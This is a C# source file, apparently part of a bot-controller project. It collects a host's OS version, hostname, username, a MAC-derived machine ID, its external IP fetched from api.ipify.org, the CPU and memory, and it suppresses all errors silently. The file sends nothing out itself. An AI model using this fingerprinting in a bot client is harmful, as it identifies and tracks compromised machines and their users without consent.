using System.Globalization;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

namespace BotController1.Core;

public class SystemInfoData
{
    public string Os;
    public string OsVersion;
    public string Hostname;
    public string Username;
    public string MachineGuid;
    public string ExternalIp;
    public string Cpu;
    public string TotalMemory;
}

public static class SystemInfo
{
    [StructLayout(LayoutKind.Sequential)]
    private struct MEMORYSTATUSEX
    {
        public uint dwLength;
        public uint dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

    public static SystemInfoData Collect()
    {
        var info = new SystemInfoData();
        try
        {
            info.Os = "Windows";
            info.OsVersion = Environment.OSVersion.Version.ToString();
            info.Hostname = Dns.GetHostName();
            info.Username = Environment.UserName;
            info.MachineGuid = MacNodeId().ToString(CultureInfo.InvariantCulture);
            try
            {
                info.ExternalIp = Net.GetString("https://api.ipify.org");
            }
            catch
            {
                info.ExternalIp = "Unknown";
            }
            info.Cpu = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER") ?? "Unknown";
            var status = new MEMORYSTATUSEX { dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>() };
            if (GlobalMemoryStatusEx(ref status))
                info.TotalMemory = $"{status.ullTotalPhys / (1024d * 1024 * 1024):F2} GB";
        }
        catch
        {
        }
        return info;
    }

    private static ulong MacNodeId()
    {
        foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (nic.NetworkInterfaceType == NetworkInterfaceType.Loopback)
                continue;
            var bytes = nic.GetPhysicalAddress().GetAddressBytes();
            if (bytes.Length != 6)
                continue;
            if (bytes.All(b => b == 0))
                continue;
            ulong value = 0;
            foreach (var b in bytes)
                value = (value << 8) | b;
            return value;
        }
        return 0;
    }
}
